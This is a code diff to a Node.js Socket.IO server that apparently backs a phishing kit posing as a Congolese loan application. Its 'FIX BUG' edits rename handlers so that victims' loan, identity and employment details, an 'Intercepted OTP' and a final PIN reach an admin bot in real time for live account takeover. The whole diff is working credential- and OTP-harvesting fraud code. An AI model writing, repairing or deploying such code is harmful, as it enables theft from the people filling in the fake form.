@@ -37,24 +37,31 @@ io.on('connection', (socket) => {
     // Generate unique Congo application session tag
     const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
-    socket.join(appId);
-    console.log(`🔌 Congo User connected: ${appId}`);
-    
     // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Standard Log Streams (No admin inline interaction buttons needed)
+    // FIX BUG 3 & 4: Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
+    socket.on('join-room', (room) => {
+        socket.join(room);
+        console.log(`🔌 Congo User joined room: ${room}`);
+    });
+
+    // Standard Log Streams
     socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
     socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
+    
+    // FIX BUG 1: Matched to frontend event 'step3-data'
+    socket.on('step3-data', (data) => {
+        botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false);
+    });
 
-    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
-    socket.on('step4', (data) => {
+    // FIX BUG 1: Matched to frontend event 'step4-otp'
+    socket.on('step4-otp', (data) => {
         botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
     });
 
-    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
-    socket.on('step5', (data) => {
+    // FIX BUG 1 & 6: Matched to frontend event 'step5-pin' and extracts data.pin correctly
+    socket.on('step5-pin', (data) => {
         botManager.sendFinalApproval(appId, data.pin);
     });
 
